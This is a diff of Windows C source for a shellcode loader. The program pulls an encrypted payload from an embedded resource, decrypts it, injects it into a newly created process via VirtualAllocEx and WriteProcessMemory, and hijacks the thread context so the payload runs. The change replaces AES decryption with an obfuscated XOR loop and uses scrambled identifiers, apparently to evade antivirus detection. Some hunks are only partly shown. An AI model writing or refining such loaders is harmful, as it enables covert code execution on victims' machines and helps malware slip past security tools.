@@ -1,3 +1,4 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -5,20 +6,13 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-
-void ENCryptheis(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
-    HCRYPTPROV hProv;
-    HCRYPTHASH hHash;
-    HCRYPTKEY hKey;
-    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
-    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
-    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
-    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
-    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);
-    CryptReleaseContext(hProv, 0);
-    CryptDestroyHash(hHash);
-    CryptDestroyKey(hKey);
-
+void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
+    DWORD da=0;
+    while (da < c1o2d3e4Len) {
+        GetTickCount();
+        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
+        da=da+1;
+    }
 }
 
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
@@ -37,12 +31,6 @@ int main() {
     char* code199k;
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
-
-     unsigned char karik12y[key101kLen];
-    unsigned char karic0d2[code199kLen];
-    memcpy(karik12y, code199k, code199kLen);
-    memcpy(karic0d2, key101k, key101kLen);
-    
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -53,8 +41,8 @@ int main() {
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    ENCryptheis((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));
-    WriteProcessMemory(pi.hProcess, memlo, karic0d2, sizeof(karic0d2), NULL);
+    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
+    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
 
